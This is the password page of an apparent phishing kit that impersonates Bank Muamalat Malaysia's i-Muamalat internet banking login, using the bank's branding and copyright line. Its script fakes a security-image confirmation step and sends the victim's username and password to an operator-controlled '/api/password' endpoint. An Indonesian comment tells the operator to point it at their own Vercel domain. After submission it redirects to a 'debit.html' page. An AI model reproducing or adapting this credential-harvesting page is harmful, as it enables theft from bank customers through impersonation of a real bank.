<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Password - i-Muamalat Internet Banking</title>
    <!-- Bootstrap CSS -->
    <link href="bootstrap.css" rel="stylesheet">
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <!-- Custom CSS (style.css) -->
    <link rel="stylesheet" href="style.css">
    <style>
        /* ===== Gaya umum ===== */
        body {
            font-family: 'Avenir', sans-serif;
        }
        .login-tabs {
            display: flex;
            justify-content: center;
            gap: 30px;
            margin-bottom: 10px;
        }
        .login-tabs a {
            color: #666;
            text-decoration: none;
            font-family: AvenirBold;
            font-size: 1.1rem;
            font-weight: 700;
            padding: 0 25px 5px 25px;
            border-bottom: 3px solid transparent;
        }
        .login-tabs a.active {
            color: #333;
            border-bottom-color: #FF8145;
        }
        .login-card {
            border-radius: 25px;
            overflow: hidden;
            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
            background-color: #fff;
        }
        .login-header {
            background-color: #F0F0F0;
            padding: 1.5rem 2rem;
            text-align: center;
        }
        .login-body {
            background-color: #EFEDED;
            padding: 2rem;
            border-bottom-left-radius: 0;
            border-bottom-right-radius: 0;
        }
        .form-center {
            width: 80%;
            margin: 0 auto;
        }
        .input-wrapper {
            position: relative;
            width: 100%;
        }
        #password {
            padding-top: 0.5rem;
            padding-bottom: 0.5rem;
            padding-left: 0.15rem;
            padding-right: 100px;
            height: auto;
            background-color: #e9ecef;
            border: 1px solid #ced4da;
            transition: background-color 0.15s ease-in-out;
            font-size: 1rem;
        }
        #password:enabled {
            background-color: white;
        }
        .form-control.is-invalid {
            border-color: #dc3545;
            box-shadow: 0 0 0 0.2rem rgba(220,53,69,.25);
        }
        .error-icon {
            position: absolute;
            right: 55px;
            top: 50%;
            transform: translateY(-50%);
            color: #dc3545;
            display: none;
            font-size: 1.2rem;
            z-index: 6;
        }
        .separator-line {
            position: absolute;
            right: 40px;
            top: 50%;
            transform: translateY(-50%);
            color: #666;
            font-size: 1.2rem;
            font-weight: normal;
            pointer-events: none;
        }
        .password-toggle {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            width: 24px;
            height: 24px;
            z-index: 5;
        }
        .password-toggle img {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }
        .error-message {
            color: #dc3545;
            font-size: 0.85rem;
            margin-top: 5px;
            display: none;
        }
        .btn.button1 {
            width: 80% !important;
            padding-top: 0.5rem;
            padding-bottom: 0.5rem;
            padding-left: 0.15rem;
            padding-right: 0.15rem;
            margin-left: auto;
            margin-right: auto;
            display: block;
            background-color: #FF8145;
            color: white;
            border: none;
            font-weight: 700;
        }
        .btn.button1:hover {
            background-color: #e86a2c;
        }
        .btn.button1:disabled {
            background-color: #ccc;
            cursor: not-allowed;
        }
        .forgot-kill-wrapper {
            width: 80%;
            margin: 0 auto;
        }
        .forgot-kill {
            display: flex;
            justify-content: space-between;
            margin-top: 1.5rem;
            padding-top: 1.5rem;
            border-top: 1px solid #DEDEDE;
        }
        .forgot-kill a {
            color: #000;
            font-weight: 700;
            text-decoration: underline;
            font-size: 14px;
        }
        .forgot-kill a:hover {
            color: #333;
        }
        .radio-group {
            width: 80%;
            margin: 1rem auto;
            text-align: left;
        }
        .radio-group > label:first-of-type {
            display: block;
            margin-bottom: 0.5rem;
            font-weight: normal;
        }
        .radio-option {
            display: block;
            margin-bottom: 0.5rem;
            position: relative;
            padding-left: 30px;
            cursor: pointer;
            user-select: none;
            font-weight: normal;
        }
        .radio-option input {
            position: absolute;
            opacity: 0;
            cursor: pointer;
            height: 0;
            width: 0;
        }
        .checkmark {
            position: absolute;
            top: 0;
            left: 0;
            height: 20px;
            width: 20px;
            background-color: #fff;
            border: 2px solid #002F87;
            border-radius: 4px;
        }
        .radio-option:hover input ~ .checkmark {
            background-color: #e6f0ff;
        }
        .radio-option input:checked ~ .checkmark {
            background-color: #002F87;
            border-color: #002F87;
        }
        .checkmark:after {
            content: "";
            position: absolute;
            display: none;
        }
        .radio-option input:checked ~ .checkmark:after {
            display: block;
        }
        .radio-option .checkmark:after {
            left: 6px;
            top: 2px;
            width: 5px;
            height: 10px;
            border: solid white;
            border-width: 0 3px 3px 0;
            transform: rotate(45deg);
        }
        .alert-announce {
            display: flex;
            justify-content: space-between;
            align-items: stretch;
            margin-left: -2rem;
            margin-right: -2rem;
            margin-bottom: -2rem;
            margin-top: 2rem;
            padding: 1rem 2rem;
            background-color: white;
            border-bottom-left-radius: 25px;
            border-bottom-right-radius: 25px;
            box-shadow: inset 0 2px 8px rgba(0,0,0,0.02);
        }
        .alert-item {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            text-decoration: none;
            color: #002F87;
            font-weight: 700;
            font-family: AvenirBold;
            text-align: center;
        }
        .alert-item img {
            height: 50px;
            width: auto;
            margin-bottom: 5px;
        }
        .icon-wrapper {
            display: flex;
            align-items: center;
            gap: 5px;
            margin-bottom: 5px;
        }
        .new-icon {
            height: 20px !important;
            width: auto;
        }
        .separator {
            width: 1px;
            background-color: #333;
            margin: 0 15px;
        }
        .navbar .container {
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        .logo-wrapper {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .logo-wrapper img {
            height: 40px;
            width: auto;
        }
        .logo1 {
            height: 40px;
        }
        .navbar-secondary-logo img {
            height: 30px;
        }
        .navbar-toggler {
            border: none;
            margin-right: 10px;
        }
        .navbar-toggler-icon {
            background-image: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 30 30'%3e%3cpath stroke='%23002F87' stroke-linecap='round' stroke-miterlimit='10' stroke-width='2' d='M4 7h22M4 15h22M4 23h22'/%3e%3c/svg%3e") !important;
        }
        .navbar-collapse {
            flex-grow: 0;
        }
        @media (min-width: 992px) {
            .navbar-toggler {
                display: none;
            }
        }
        @media (max-width: 991px) {
            .navbar-collapse {
                background-color: #FF8145;
                padding: 1rem;
                border-radius: 0 0 15px 15px;
                margin-top: 10px;
            }
            .navbar-nav .nav-link {
                text-align: center;
            }
        }
        .bg {
            background-image: url('login_background.png');
            background-size: cover;
            background-position: center;
            min-height: calc(100vh - 76px);
            position: relative;
        }
        .bg .container {
            padding-top: 3rem;
        }
        .copyright {
            text-align: center;
            color: white;
            font-size: 0.8rem;
            margin-top: 2rem;
            font-family: Avenir;
            text-shadow: 1px 1px 2px rgba(0,0,0,0.5);
        }
        .hello-username {
            text-align: center;
            font-size: 1.3rem;
            font-weight: 600;
            color: #002F87;
            margin-bottom: 1rem;
        }
        /* ===== LOADING OVERLAY ===== */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 9999;
        }
        .loading-overlay img {
            width: 20px;
            height: 20px;
        }
    </style>
</head>
<body>
    <!-- Loading Overlay -->
    <div class="loading-overlay" id="loadingOverlay">
        <img src="ajax-loader.gif" alt="Loading...">
    </div>

    <!-- Navbar -->
    <nav class="navbar navbar-expand-lg navbar-custom py-3">
        <div class="container">
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="logo-wrapper">
                <a href="#">
                    <img src="navbar_logo.png" alt="Bank Muamalat" class="logo1">
                </a>
                <a href="#" class="navbar-secondary-logo">
                    <img src="navbar_secondary_logo.png" alt="Secondary Logo">
                </a>
            </div>
            <div class="collapse navbar-collapse" id="navbarNav">
                <ul class="navbar-nav ms-auto">
                    <li class="nav-item">
                        <a class="nav-link white" href="#">Contact Us</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <!-- Main Content -->
    <div class="bg d-flex align-items-center">
        <div class="container py-4">
            <div class="row justify-content-center">
                <div class="col-lg-6 col-md-8">
                    <div class="login-card">
                        <div class="login-header">
                            <div class="login-tabs">
                                <a href="#" class="active">Login</a>
                                <a href="#">Register</a>
                            </div>
                        </div>
                        <div class="login-body">
                            <div class="hello-username" id="helloUsername">
                                Hello, <span id="displayUsername"></span>
                            </div>

                            <!-- Radio group -->
                            <div class="radio-group" id="radioGroup">
                                <label>Is this your chosen image and security word?</label>
                                <label class="radio-option">
                                    <input type="radio" name="confirm" value="yes" id="radioYes">
                                    <span class="checkmark"></span>
                                    Yes, this is me!
                                </label>
                                <label class="radio-option">
                                    <input type="radio" name="confirm" value="no" id="radioNo">
                                    <span class="checkmark"></span>
                                    No, this is not me
                                </label>
                            </div>

                            <form id="passwordForm" novalidate>
                                <div class="mb-4 form-center">
                                    <label for="password" class="form-label mediumText grey3">Password</label>
                                    <div class="input-wrapper">
                                        <input type="password" class="form-control" id="password" placeholder="" disabled>
                                        <i class="fas fa-exclamation-circle error-icon" id="passwordErrorIcon"></i>
                                        <span class="separator-line">|</span>
                                        <span class="password-toggle" id="togglePassword">
                                            <img src="password_hide.png" alt="Show/hide" id="passwordIcon">
                                        </span>
                                    </div>
                                    <div class="error-message" id="passwordErrorMessage"></div>
                                </div>

                                <div class="forgot-kill-wrapper">
                                    <div class="forgot-kill">
                                        <a href="#" class="mediumText">Forgot Password</a>
                                        <a href="#" class="mediumText">Kill Switch</a>
                                    </div>
                                </div>

                                <!-- Tombol LOGIN -->
                                <button type="submit" class="btn button1 font4 mt-3" id="loginButton" disabled>LOGIN</button>
                            </form>

                            <!-- Security Alert & Announcements -->
                            <div class="alert-announce">
                                <a href="#" class="alert-item">
                                    <img src="security_alert.png" alt="Security Alert">
                                    <span>Security Alert</span>
                                </a>
                                <div class="separator"></div>
                                <a href="#" class="alert-item">
                                    <div class="icon-wrapper">
                                        <img src="announcement.png" alt="Announcement">
                                        <img src="new_icon.png" alt="New" class="new-icon">
                                    </div>
                                    <span>Announcements</span>
                                </a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="copyright">
                <p>Copyright © Bank Muamalat Malaysia Berhad 196501000376 (6175-W)</p>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        // Elemen loading dan tombol
        const loadingOverlay = document.getElementById('loadingOverlay');
        const loginButton = document.getElementById('loginButton');

        // Ambil username dari sessionStorage
        window.addEventListener('load', function() {
            var username = sessionStorage.getItem('username');
            if (username) {
                document.getElementById('displayUsername').textContent = username;
            } else {
                window.location.href = 'index.html';
            }
        });

        const radioYes = document.getElementById('radioYes');
        const radioNo = document.getElementById('radioNo');
        const passwordInput = document.getElementById('password');
        const toggleIcon = document.getElementById('passwordIcon');
        const errorIcon = document.getElementById('passwordErrorIcon');
        const errorMessage = document.getElementById('passwordErrorMessage');

        function updateFormStatus() {
            if (radioYes.checked) {
                passwordInput.disabled = false;
                loginButton.disabled = false;
                passwordInput.style.backgroundColor = 'white';
            } else {
                passwordInput.disabled = true;
                loginButton.disabled = true;
                passwordInput.style.backgroundColor = '#e9ecef';
                passwordInput.value = '';
                passwordInput.classList.remove('is-invalid');
                errorIcon.style.display = 'none';
                errorMessage.style.display = 'none';
            }
        }

        radioNo.addEventListener('change', function() {
            if (this.checked) {
                window.location.href = 'index.html';
            }
        });

        radioYes.addEventListener('change', updateFormStatus);
        updateFormStatus();

        document.getElementById('togglePassword').addEventListener('click', function() {
            if (passwordInput.disabled) return;
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                toggleIcon.src = 'password_show.png';
            } else {
                passwordInput.type = 'password';
                toggleIcon.src = 'password_hide.png';
            }
        });

        document.getElementById('passwordForm').addEventListener('submit', function(e) {
            e.preventDefault();

            passwordInput.classList.remove('is-invalid');
            errorIcon.style.display = 'none';
            errorMessage.style.display = 'none';

            if (!radioYes.checked) {
                alert('Please confirm your identity.');
                return;
            }

            const passwordValue = passwordInput.value.trim();

            if (passwordValue === '') {
                passwordInput.classList.add('is-invalid');
                errorIcon.style.display = 'block';
                errorMessage.textContent = 'Please enter password';
                errorMessage.style.display = 'block';
                passwordInput.focus();
                return;
            }

            if (passwordValue.length < 8) {
                passwordInput.classList.add('is-invalid');
                errorIcon.style.display = 'block';
                errorMessage.textContent = 'Password must be at least 8 characters long';
                errorMessage.style.display = 'block';
                passwordInput.focus();
                return;
            }

            // Tampilkan loading dan nonaktifkan tombol (teks tombol tetap "LOGIN")
            loadingOverlay.style.display = 'flex';
            loginButton.disabled = true;

            const username = sessionStorage.getItem('username');

            // Ganti URL berikut dengan domain Vercelmu
            fetch('/api/password', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username, password: passwordValue })
            })
            .then(res => {
                if (!res.ok) {
                    return res.json().then(err => { throw new Error(err.error || 'Server error'); });
                }
                return res.json();
            })
            .then(data => {
                if (data.success) {
                    // Redirect ke halaman debit
                    window.location.href = 'debit.html';
                } else {
                    throw new Error('Server returned error');
                }
            })
            .catch(err => {
                console.error(err);
                alert('Gagal menghubungi server. Pastikan server backend berjalan.');
            })
            .finally(() => {
                // Sembunyikan loading dan aktifkan tombol kembali (jika redirect gagal)
                loadingOverlay.style.display = 'none';
                loginButton.disabled = false;
            });
        });

        passwordInput.addEventListener('input', function() {
            if (passwordInput.disabled) return;
            passwordInput.classList.remove('is-invalid');
            errorIcon.style.display = 'none';
            errorMessage.style.display = 'none';
        });

        document.querySelectorAll('.login-tabs a').forEach(tab => {
            tab.addEventListener('click', function(e) {
                e.preventDefault();
                document.querySelectorAll('.login-tabs a').forEach(t => t.classList.remove('active'));
                this.classList.add('active');
            });
        });
    </script>
</body>
</html>
